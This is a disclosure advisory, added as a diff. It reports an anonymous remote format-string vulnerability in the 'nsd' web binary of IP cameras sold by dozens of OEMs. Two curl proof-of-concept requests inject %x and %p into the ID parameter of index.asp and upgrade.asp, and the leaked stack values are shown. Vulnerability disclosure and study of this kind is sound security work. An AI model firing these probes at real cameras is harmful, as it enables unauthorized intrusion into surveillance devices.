@@ -1,0 +1,123 @@
+[STX]
+
+Subject: Remote Stack Format String in 'nsd' binary from multiple OEM
+
+Attack vector: Remote
+Authentication: Anonymous (no credentials needed)
+Researcher: bashis <mcw noemail eu> (December 2017)
+PoC: https://github.com/mcw0/PoC
+Release date: December 14, 2017
+Full Disclosure: 0-Day
+
+
+-[ PoC ]-
+
+1)
+$ curl 'http://[IP:PORT]/main/index.asp?ID=AAAA|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x&lg=BBBB'
+
+[...]
+	 function initHideWidget(){
+	 document.getElementById("devip").value = "192.168.57.20";
+	 document.getElementById("cameraid").value = 1;
+	 document.getElementById("streamid").value = 1;
+	 document.getElementById("id").value = "AAAA|5e2ff9f8|ffffffff|5e3006db|ea60|1|2|1|1|0|20cd3e0|7263733c|20747069";
+	 document.getElementById("lg").value = "BBBB";
+	 document.getElementById("port").value = 60000;
+	 document.getElementById("ipver").value = 1;
+	 document.getElementById("tprotocol").value = 2;
+	 document.getElementById("devtype").value = 1;
+	 document.getElementById("ismotorize").value = 1;
+
+[...]
+Note: 'BBBB' are hiding within '5e3006db'
+
+2)
+curl -v "http://[IP:PORT]/Maintain/upgrade.asp?ID=|%p|%p|%p|%p|%p|%p"
+[...]
+	 function initHideWidget(){
+	 document.getElementById("ip").value = "192.168.57.20";
+	 document.getElementById("id").value = "|0x5d300484|0xffffffff|0xea60|0x1|0x2|0x1";
+	 document.getElementById("port").value = 60000;
+	 document.getElementById("ipver").value = 1;
+	 document.getElementById("tprotocol").value = 2;
+	 document.getElementById("devtype").value = 1;
+[...]
+
+
+-[ Affected OEM ]-
+
+Huatu
+I-View
+IP Camera Web Service
+Stanley Security
+3D Eyes CCTV Platform
+Protech Srl
+LS vision 
+GWSECU
+12 Legion Solution
+HDVuk IP Camera
+Intervid Security
+Suzuki Tech
+Wellsite IP Camera
+iBrido
+Protec IP Camera
+Maxtron IP Camera
+Ascendent
+GTvs IP Camera
+Squilla
+Bikal IP Camera
+MW Power
+Alfa Vision
+KMA Security
+Tough Dog Security
+Kpro HQ
+Lanetwork
+AFM Vision
+ZetaDo
+Jobsight Inc.
+Datalab IP Technologies
+4Tvision
+Proline UK
+Tanz
+Aisonic
+HD-IP
+PreSec Security Solution
+EagleVision
+Elemis Delta
+Imenara
+Gigamedia
+Xavee
+Honeywell
+Boss Security
+A.R.T Surveillance
+Global Security
+Securicorp
+Securetech
+Vapplica
+Star
+Stic
+NeXus
+Alnet
+Spy Smart
+Kompsos
+Adler Security Systems
+Nextan
+Access
+Toprotect
+Kawah
+LS StrateX
+Senpei CCTV
+Metcom
+AFM Vision
+Doron Technologies
+Saviour Smart IoT Systems
+Eagle-Eye
+Faucon.at
+BlueEagle Security
+Campro
+Opple
+Level One
+Video and Monitor System
+K&D
+
+[ETX]
